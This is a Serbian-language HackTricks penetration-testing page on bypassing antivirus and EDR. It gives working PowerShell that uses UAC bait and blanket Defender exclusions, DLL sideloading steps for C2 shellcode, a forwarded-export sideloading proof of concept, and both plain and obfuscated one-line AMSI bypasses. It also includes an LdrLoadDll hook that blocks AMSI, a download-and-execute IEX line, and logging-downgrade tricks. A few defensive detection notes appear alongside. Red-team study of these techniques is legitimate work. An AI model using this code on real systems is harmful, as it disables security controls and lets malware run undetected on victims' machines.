# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Ovu stranicu je prvobitno napisao** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Stop Defender

- [defendnot](https://github.com/es3n1n/defendnot): Alat za zaustavljanje rada Windows Defender-a.
- [no-defender](https://github.com/es3n1n/no-defender): Alat za zaustavljanje rada Windows Defender-a lažiranjem drugog AV.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

### Installer-style UAC bait before tampering with Defender

Javno dostupni loader-i koji se maskiraju kao game cheats često dolaze kao nepodpisani Node.js/Nexe installer-i koji prvo **traže od korisnika elevation** i tek onda neutrališu Defender. Tok je jednostavan:

1. Proveri da li postoji administratorski kontekst pomoću `net session`. Komanda uspeva samo kada pozivalac ima admin prava, pa neuspeh znači da loader radi kao standardni korisnik.
2. Odmah se ponovo pokrene sa `RunAs` verbom kako bi pokrenuo očekivani UAC consent prompt, uz zadržavanje originalne command line.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
Žrtve već veruju da instaliraju “cracked” softver, pa se prompt obično prihvata, dajući malveru prava koja su mu potrebna da promeni Defender politiku.

### Blanket `MpPreference` exclusions for every drive letter

Kada dobije elevaciju, GachiLoader-style chains maksimalno povećavaju slepe tačke Defender-a umesto da potpuno onemoguće servis. Loader prvo ubija GUI watchdog (`taskkill /F /IM SecHealthUI.exe`) a zatim postavlja **izuzetno široke exclusions** tako da svaki user profile, system directory i removable disk postanu neproverljivi:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Ključna zapažanja:

- Petlja prolazi kroz svaki mountovani filesystem (D:\, E:\, USB stickovi, itd.), tako da se **svaki budući payload bačen bilo gde na disku ignoriše**.
- Isključenje za ekstenziju `.sys` je unapred planirano — napadači zadržavaju opciju da kasnije učitaju unsigned drivere bez ponovnog diranja Defendera.
- Sve promene završavaju pod `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, što kasnijim fazama omogućava da potvrde da isključenja ostaju ili da ih prošire bez ponovnog okidanja UAC.

Pošto nijedna Defender service nije zaustavljena, naivni health checks i dalje prijavljuju „antivirus active“, iako real-time inspection nikada ne dotiče te putanje.

## **AV Evasion Methodology**

Trenutno, AV-ovi koriste različite metode za proveru da li je fajl maliciozan ili ne: static detection, dynamic analysis i, za naprednije EDR-ove, behavioural analysis.

### **Static detection**

Static detection se postiže označavanjem poznatih malicioznih stringova ili nizova bajtova u binariju ili skripti, kao i izvlačenjem informacija iz samog fajla (npr. file description, company name, digital signatures, icon, checksum, itd.). To znači da korišćenje poznatih javnih alata može lakše dovesti do detekcije, jer su verovatno već analizirani i označeni kao maliciozni. Postoji nekoliko načina da se zaobiđe ovakva detekcija:

- **Encryption**

Ako enkriptuješ binarij, AV neće imati način da detektuje tvoj program, ali će ti trebati neki loader koji će dekriptovati i pokrenuti program u memoriji.

- **Obfuscation**

Ponekad je dovoljno samo da promeniš neke stringove u svom binariju ili skripti da bi prošao AV, ali to može biti vremenski zahtevan posao, zavisno od toga šta pokušavaš da obfuskiraš.

- **Custom tooling**

Ako razvijaš sopstvene alate, neće biti poznatih loših signatures, ali to zahteva mnogo vremena i truda.

> [!TIP]
> Dobar način da proveriš Windows Defender static detection je [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). On u osnovi deli fajl na više segmenata, a zatim tera Defender da svaki skenira pojedinačno, tako da može tačno da ti kaže koji su stringovi ili bajtovi označeni u tvom binariju.

Toplo preporučujem da pogledaš ovu [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) o praktičnom AV Evasion.

### **Dynamic analysis**

Dynamic analysis je kada AV pokreće tvoj binarij u sandboxu i prati malicioznu aktivnost (npr. pokušaj dekripcije i čitanja lozinki iz browsera, pravljenje minidump-a nad LSASS, itd.). Ovaj deo može biti malo komplikovaniji za rad, ali evo nekoliko stvari koje možeš da uradiš da bi zaobišao sandboxove.

- **Sleep before execution** U zavisnosti od implementacije, ovo može biti odličan način za zaobilaženje AV dynamic analysis. AV-ovi imaju vrlo kratko vreme da skeniraju fajlove kako ne bi ometali korisnikov workflow, pa dugi sleep-ovi mogu poremetiti analizu binarija. Problem je što mnogi AV sandboxovi mogu jednostavno da preskoče sleep, zavisno od implementacije.
- **Checking machine's resources** Obično sandboxovi imaju vrlo malo resursa na raspolaganju (npr. < 2GB RAM), inače bi mogli da uspore korisnikov računar. Ovde možeš biti i veoma kreativan, na primer tako što proveravaš CPU temperaturu ili čak brzinu ventilatora; nije sve implementirano u sandboxu.
- **Machine-specific checks** Ako želiš da ciljaš korisnika čija je workstation pridružena "contoso.local" domain-u, možeš da proveriš computer domain da vidiš da li se poklapa sa onim koji si naveo; ako se ne poklapa, možeš da nateraš program da izađe.

Ispostavilo se da je ime računara u Microsoft Defender Sandbox-u HAL9TH, pa možeš da proveriš computer name u svom malware-u pre detonacije; ako se ime poklapa sa HAL9TH, to znači da si unutar defender's sandboxa, pa možeš da nateraš program da izađe.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Još neki baš dobri saveti od [@mgeeky](https://twitter.com/mariuszbit) za borbu protiv Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Kao što smo već rekli u ovom postu, **public tools** će na kraju **biti detektovani**, pa bi trebalo da se zapitaš nešto:

Na primer, ako želiš da dump-uješ LSASS, **da li zaista moraš da koristiš mimikatz**? Ili možeš da koristiš neki drugi, manje poznat projekat koji takođe dump-uje LSASS.

Pravi odgovor je verovatno ovo drugo. Uzimajući mimikatz kao primer, on je verovatno jedan od, ako ne i najflagovaniji komad malware-a od strane AV-ova i EDR-ova, a iako je sam projekat super kul, takođe je noćna mora za rad kada pokušavaš da zaobiđeš AV, pa jednostavno traži alternative za ono što pokušavaš da postigneš.

> [!TIP]
> Kada menjaš svoje payloads radi evasiona, obavezno **isključi automatic sample submission** u defender-u, i molim te, ozbiljno, **NE UPLOADUJ NA VIRUSTOTAL** ako ti je cilj da dugoročno postigneš evasion. Ako želiš da proveriš da li tvoj payload detektuje neki konkretan AV, instaliraj ga na VM, pokušaj da isključiš automatic sample submission i testiraj tamo dok ne budeš zadovoljan rezultatom.

## EXEs vs DLLs

Kad god je moguće, uvek **daj prednost korišćenju DLL-ova za evasion**, po mom iskustvu, DLL fajlovi su obično **mnogo manje detektovani** i analizirani, pa je to vrlo jednostavan trik koji može da se koristi da bi se u nekim slučajevima izbegla detekcija (naravno, ako tvoj payload ima neki način da se pokrene kao DLL).

Kao što možemo da vidimo na ovoj slici, DLL Payload iz Havoc-a ima detection rate od 4/26 na antiscan.me, dok EXE payload ima detection rate od 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

Sada ćemo pokazati neke trikove koje možeš da koristiš sa DLL fajlovima da budeš mnogo stealthier.

## DLL Sideloading & Proxying

**DLL Sideloading** koristi prednost DLL search order-a koji koristi loader tako što postavlja i victim application i malicious payload(s) jedno pored drugog.

Možeš da proveriš programe podložne DLL Sideloading-u koristeći [Siofra](https://github.com/Cybereason/siofra) i sledeći powershell script:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Ova komanda će izlistati programe podložne DLL hijacking-u unutar "C:\Program Files\\" i DLL fajlove koje pokušavaju da učitaju.

Toplo preporučujem da **samostalno istražite DLL Hijackable/Sideloadable programe**, ova tehnika je prilično stealthy ako se uradi pravilno, ali ako koristite javno poznate DLL Sideloadable programe, možete lako biti otkriveni.

Samo postavljanje malicious DLL-a sa imenom koje program očekuje da učita neće učitati vaš payload, jer program očekuje neke specifične funkcije unutar tog DLL-a, pa ćemo za rešavanje ovog problema koristiti drugu tehniku zvanu **DLL Proxying/Forwarding**.

**DLL Proxying** prosleđuje pozive koje program pravi sa proxy (i malicious) DLL-a na originalni DLL, čime se zadržava funkcionalnost programa i omogućava izvršavanje vašeg payload-a.

Koristiću [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) projekat od [@flangvik](https://twitter.com/Flangvik/)

Ovo su koraci koje sam pratio:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Poslednja komanda će nam dati 2 fajla: šablon izvornog koda DLL-a i originalni preimenovani DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
Ovo su rezultati:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

I naš shellcode (enkodiran pomoću [SGN](https://github.com/EgeBalci/sgn)) i proxy DLL imaju 0/26 Detection rate na [antiscan.me](https://antiscan.me)! To bih nazvao uspehom.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> **Toplo preporučujem** da pogledate [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) o DLL Sideloading, kao i [ippsec-ov video](https://www.youtube.com/watch?v=3eROsG_WNpE) da biste detaljnije naučili više o onome o čemu smo razgovarali.

### Zloupotreba Forwarded Exports (ForwardSideLoading)

Windows PE moduli mogu da eksportuju funkcije koje su zapravo "forwarders": umesto da pokazuju na kod, export entry sadrži ASCII string u formatu `TargetDll.TargetFunc`. Kada pozivalac rezolvuje export, Windows loader će:

- Učitati `TargetDll` ako već nije učitan
- Rezolvovati `TargetFunc` iz njega

Ključna ponašanja koja treba razumeti:
- Ako je `TargetDll` KnownDLL, isporučuje se iz zaštićenog KnownDLLs namespace-a (npr. ntdll, kernelbase, ole32).
- Ako `TargetDll` nije KnownDLL, koristi se normalan redosled pretrage DLL-ova, koji uključuje direktorijum modula koji radi forward resolution.

Ovo omogućava indirektni sideloading primitive: pronađite potpisani DLL koji eksportuje funkciju forwardovanu ka imenu modula koji nije KnownDLL, a zatim postavite taj potpisani DLL zajedno sa DLL-om pod kontrolom napadača koji je nazvan tačno kao forwardovani target modul. Kada se pozove forwarded export, loader rezolvuje forward i učitava vaš DLL iz istog direktorijuma, izvršavajući vaš DllMain.

Primer primećen na Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` nije KnownDLL, tako da se rešava preko normalnog redosleda pretrage.

PoC (copy-paste):
1) Kopiraj potpisani sistemski DLL u upisivanu fasciklu
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Postavite maliciozni `NCRYPTPROV.dll` u isti folder. Minimalni DllMain je dovoljan da se dobije izvršavanje koda; ne morate implementirati forwarded funkciju da biste okinuli DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Pokreni prosleđivanje pomoću potpisanog LOLBin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Posmatrano ponašanje:
- rundll32 (signed) učitava side-by-side `keyiso.dll` (signed)
- Tokom rešavanja `KeyIsoSetAuditingInterface`, loader prati forward do `NCRYPTPROV.SetAuditingInterface`
- Loader zatim učitava `NCRYPTPROV.dll` iz `C:\test` i izvršava njen `DllMain`
- Ako `SetAuditingInterface` nije implementiran, dobićete "missing API" grešku tek nakon što je `DllMain` već pokrenut

Saveti za hunting:
- Fokusirajte se na forwarded exports gde ciljmodul nije KnownDLL. KnownDLLs se nalaze pod `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Možete enumerisati forwarded exports pomoću alata kao što su:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Pogledajte Windows 11 forwarder inventory da tražite kandidate: https://hexacorn.com/d/apis_fwd.txt

Detection/defense ideje:
- Nadgledajte LOLBins (npr. rundll32.exe) koji učitavaju potpisane DLL-ove iz non-system path-ova, nakon čega učitavaju non-KnownDLLs sa istim base imenom iz tog direktorijuma
- Alarmirajte na process/module chains kao: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` pod user-writable path-ovima
- Primenite code integrity policies (WDAC/AppLocker) i zabranite write+execute u application direktorijumima

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Možete koristiti Freeze da učitate i izvršite svoj shellcode na stealthy način.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion je samo igra mačke i miša; ono što radi danas sutra može biti detektovano, zato se nikad nemoj oslanjati samo na jedan alat, ako je moguće, pokušaj da povežeš više evasion tehnika.

## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)

EDR-ovi često postavljaju **user-mode inline hooks** na `ntdll.dll` syscall stub-ove. Da bi zaobišao te hook-ove, možeš da generišeš **direct** ili **indirect** syscall stub-ove koji učitavaju ispravan **SSN** (System Service Number) i prelaze u kernel mode bez izvršavanja hook-ovanog export entrypoint-a.

**Opcije pozivanja:**
- **Direct (embedded)**: ubaci `syscall`/`sysenter`/`SVC #0` instrukciju u generisani stub (nema `ntdll` export poziva).
- **Indirect**: skoči u postojeći `syscall` gadget unutar `ntdll` tako da kernel transition izgleda kao da potiče iz `ntdll` (korisno za heuristic evasion); **randomized indirect** bira gadget iz pool-a po pozivu.
- **Egg-hunt**: izbegavaj ugrađivanje statičkog `0F 05` opcode niza na disk; rešavaj syscall sekvencu u runtime-u.

**Strategije za SSN resolution otporne na hook-ove:**
- **FreshyCalls (VA sort)**: inferiši SSN-ove sortiranjem syscall stub-ova po virtual address umesto čitanja bytes-ova stub-a.
- **SyscallsFromDisk**: mapiraj čist `\KnownDlls\ntdll.dll`, pročitaj SSN-ove iz njegovog `.text`, pa ga unmapuj (zaobilazi sve in-memory hook-ove).
- **RecycledGate**: kombinuje VA-sorted SSN inference sa opcode validacijom kada je stub čist; vrati se na VA inference ako je hook-ovan.
- **HW Breakpoint**: postavi DR0 na `syscall` instrukciju i koristi VEH da uhvatiš SSN iz `EAX` u runtime-u, bez parsiranja hook-ovanih bytes-ova.

Primer korišćenja SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```
## AMSI (Anti-Malware Scan Interface)

AMSI je napravljen da spreči "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". U početku su AV-ovi mogli da skeniraju samo **fajlove na disku**, pa ako bi nekako mogao da izvršavaš payload-ove **direktno u memoriji**, AV ne bi mogao ništa da uradi da to spreči, jer nije imao dovoljnu vidljivost.

AMSI funkcionalnost je integrisana u ove komponente Windows-a.

- User Account Control, ili UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (skripte, interaktivna upotreba i dinamička evaluacija koda)
- Windows Script Host (wscript.exe i cscript.exe)
- JavaScript i VBScript
- Office VBA macros

Omogućava antivirus rešenjima da pregledaju ponašanje skripti tako što izlaže sadržaj skripti u formi koja je i nešifrovana i neobfuskovana.

Pokretanje `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` će proizvesti sledeći alert na Windows Defender-u.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Primeti kako dodaje `amsi:` i zatim path do izvršne datoteke iz koje je skripta pokrenuta, u ovom slučaju, powershell.exe

Nismo ispustili nijedan fajl na disk, ali smo ipak uhvaćeni u memoriji zbog AMSI-ja.

Takođe, počevši od **.NET 4.8**, C# kod se takođe prosleđuje kroz AMSI. Ovo čak utiče i na `Assembly.Load(byte[])` za in-memory execution. Zato se preporučuje korišćenje nižih verzija .NET-a (kao što su 4.7.2 ili niže) za in-memory execution ako želiš da izbegneš AMSI.

Postoji nekoliko načina da se zaobiđe AMSI:

- **Obfuscation**

Pošto AMSI uglavnom radi sa static detections, modifikovanje skripti koje pokušavaš da učitaš može biti dobar način za evasion.

Međutim, AMSI ima mogućnost da unobfuscate-uje skripte čak i ako imaju više slojeva, pa obfuscation može biti loša opcija u zavisnosti od toga kako je urađena. Zbog toga evasion nije baš jednostavan. Ipak, ponekad je dovoljno da promeniš samo nekoliko imena varijabli i bićeš dobar, pa zavisi od toga koliko je nešto flag-ovano.

- **AMSI Bypass**

Pošto je AMSI implementiran učitavanjem DLL-a u powershell (takođe cscript.exe, wscript.exe, itd.) proces, moguće je lako ga menjati čak i kada se izvršava kao unprivileged user. Zbog ove mane u implementaciji AMSI-ja, istraživači su pronašli više načina da zaobiđu AMSI scanning.

**Forcing an Error**

Forsiranje da AMSI inicijalizacija fail-uje (amsiInitFailed) će rezultirati time da se nijedno skeniranje neće pokrenuti za trenutni proces. Ovo je prvobitno otkrio [Matt Graeber](https://twitter.com/mattifestation), a Microsoft je razvio signature da spreči širu upotrebu.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Sve što je bilo potrebno bila je jedna linija powershell koda da AMSI postane neupotrebljiv za trenutni powershell proces. Ova linija je, naravno, sama po sebi bila označena od strane AMSI, pa je potrebna neka modifikacija kako bi se koristila ova tehnika.

Evo modifikovanog AMSI bypass-a koji sam uzeo iz ovog [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Imajte na umu da će ovo verovatno biti označeno čim ovaj post izađe, pa ne bi trebalo da objavljujete bilo kakav kod ako vam je plan da ostanete neotkriveni.

**Memory Patching**

Ova tehnika je prvobitno otkrivena od strane [@RastaMouse](https://twitter.com/_RastaMouse/) i uključuje pronalaženje adrese za funkciju "AmsiScanBuffer" u amsi.dll (odgovornu za skeniranje korisnički prosleđenog inputa) i njenim prepisivanjem instrukcijama koje vraćaju kod za E_INVALIDARG, na ovaj način, rezultat stvarnog skeniranja će vratiti 0, što se tumači kao čist rezultat.

> [!TIP]
> Molimo pročitajte [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) za detaljnije objašnjenje.

Postoje i mnoge druge tehnike koje se koriste za bypass AMSI sa powershell, pogledajte [**ovu stranicu**](basic-powershell-for-pentesters/index.html#amsi-bypass) i [**ovaj repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) da biste saznali više o njima.

### Blocking AMSI by preventing amsi.dll load (LdrLoadDll hook)

AMSI se inicijalizuje tek nakon što se `amsi.dll` učita u trenutni proces. Robustan, jezički agnostičan bypass je postavljanje user-mode hook-a na `ntdll!LdrLoadDll` koji vraća grešku kada je traženi modul `amsi.dll`. Kao rezultat toga, AMSI se nikada ne učitava i ne dolazi do skeniranja za taj proces.

Outline implementacije (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notes
- Radi across PowerShell, WScript/CScript i custom loaders podjednako (bilo šta što bi inače učitalo AMSI).
- Upari sa slanjem skripti preko stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) da bi izbegao duge command-line tragove.
- Viđeno je da ga koriste loader-i pokrenuti preko LOLBins (npr. `regsvr32` poziva `DllRegisterServer`).

Tool **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** takođe generiše script za bypass AMSI.
Tool **[https://amsibypass.com/](https://amsibypass.com/)** takođe generiše script za bypass AMSI koji izbegava signature pomoću randomized user-defined function, variables, characters expression i primenjuje random character casing na PowerShell keywords da bi izbegao signature.

**Ukloni detektovani signature**

Možeš da koristiš tool kao što su **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** i **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** da ukloniš detektovani AMSI signature iz memorije trenutnog procesa. Ovaj tool radi tako što skenira memoriju trenutnog procesa za AMSI signature i zatim ga prepisuje NOP instrukcijama, efektivno ga uklanjajući iz memorije.

**AV/EDR products that uses AMSI**

Možeš da nađeš listu AV/EDR products that uses AMSI u **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Koristi Powershell version 2**
Ako koristiš PowerShell version 2, AMSI neće biti učitan, pa možeš da pokreneš svoje skripte bez da ih AMSI skenira. Možeš da uradiš ovo:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging je funkcija koja omogućava da beležite sve PowerShell komande izvršene na sistemu. Ovo može biti korisno za potrebe auditiranja i rešavanja problema, ali može biti i **problem za napadače koji žele da izbegnu detekciju**.

Da biste zaobišli PowerShell logging, možete koristiti sledeće tehnike:

- **Disable PowerShell Transcription and Module Logging**: Možete koristiti alat kao što je [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) za ovu namenu.
- **Use Powershell version 2**: Ako koristite PowerShell verziju 2, AMSI neće biti učitan, pa možete pokretati skripte bez skeniranja od strane AMSI. To možete uraditi ovako: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: Koristite [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) da pokrenete powershell bezbednosnih mehanizama (ovo je ono što `powerpick` iz Cobal Strike koristi).


## Obfuscation

> [!TIP]
> Nekoliko obfuscation tehnika se oslanja na enkripciju podataka, što će povećati entropiju binarne datoteke i tako olakšati AV i EDR alatima da je detektuju. Budite oprezni s ovim i možda primenjujte enkripciju samo na određene delove koda koji su osetljivi ili treba da budu sakriveni.

### Deobfuscating ConfuserEx-Protected .NET Binaries

Kada analizirate malware koji koristi ConfuserEx 2 (ili komercijalne forkove), uobičajeno je naići na nekoliko slojeva zaštite koji blokiraju dekompajlere i sandboxe. Donji workflow pouzdano **vraća skoro originalni IL** koji se zatim može dekompajlirati u C# u alatima kao što su dnSpy ili ILSpy.

1.  Uklanjanje anti-tampering zaštite – ConfuserEx šifrira svako *method body* i dešifruje ga unutar statičkog konstruktora *module* (`<Module>.cctor`). Ovo takođe zakrpljuje PE checksum, pa će svaka izmena srušiti binarnu datoteku. Koristite **AntiTamperKiller** da locirate šifrovane metadata tabele, oporavite XOR ključeve i prepišete čistu assembly:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Output sadrži 6 anti-tamper parametara (`key0-key3`, `nameHash`, `internKey`) koji mogu biti korisni pri pravljenju sopstvenog unpacker-a.

2.  Oporavak simbola / control-flow – prosledite *clean* fajl alatu **de4dot-cex** (fork de4dot-a koji je svestan ConfuserEx-a).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – izaberite profil za ConfuserEx 2
• de4dot će poništiti control-flow flattening, vratiti originalne namespace-ove, klase i imena promenljivih i dešifrovati konstantne stringove.

3.  Uklanjanje proxy-call-ova – ConfuserEx zamenjuje direktne pozive metoda laganim wrapper-ima (a.k.a *proxy calls*) da bi dodatno otežao dekompajliranje. Uklonite ih pomoću **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Nakon ovog koraka trebalo bi da vidite normalan .NET API kao što je `Convert.FromBase64String` ili `AES.Create()` umesto neprozirnih wrapper funkcija (`Class8.smethod_10`, …).

4.  Ručno čišćenje – pokrenite dobijenu binarnu datoteku u dnSpy, pretražite velike Base64 blob-ove ili upotrebu `RijndaelManaged`/`TripleDESCryptoServiceProvider` da locirate *real* payload. Često malware čuva payload kao TLV-enkodovan byte array inicijalizovan unutar `<Module>.byte_0`.

Gornji chain vraća execution flow **bez** potrebe da pokrećete malicious sample – korisno kada radite na offline workstation-u.

> 🛈  ConfuserEx proizvodi custom attribute pod nazivom `ConfusedByAttribute` koji može da se koristi kao IOC za automatsko triage-ovanje sample-ova.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Cilj ovog projekta je da obezbedi open-source fork [LLVM](http://www.llvm.org/) compilation suite-a koji može da pruži povećanu softversku bezbednost kroz [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) i tamper-proofing.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstira kako da se koristi jezik `C++11/14` za generisanje, u vreme kompilacije, obfuscated koda bez korišćenja bilo kakvog eksternog alata i bez modifikovanja compiler-a.
- [**obfy**](https://github.com/fritzone/obfy): Dodaje sloj obfuscated operacija generisanih pomoću C++ template metaprogramming framework-a, što će malo otežati život osobi koja želi da crack-uje aplikaciju.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz je x64 binary obfuscator koji može da obfuscate-uje različite pe fajlove uključujući: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame je jednostavan metamorphic code engine za arbitrarne executables.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator je framework za fine-grained code obfuscation za jezike koje podržava LLVM, koristeći ROP (return-oriented programming). ROPfuscator obfuscate-uje program na nivou assembly koda transformacijom regularnih instrukcija u ROP chains, osujećujući našu prirodnu predstavu o normalnom control flow-u.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt je .NET PE Crypter napisan u Nim-u
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor može da konvertuje postojeći EXE/DLL u shellcode i zatim da ih učita

## SmartScreen & MoTW

Možda ste videli ovaj ekran kada preuzimate neke executables sa interneta i izvršavate ih.

Microsoft Defender SmartScreen je sigurnosni mehanizam namenjen da zaštiti krajnjeg korisnika od pokretanja potencijalno malicioznih aplikacija.

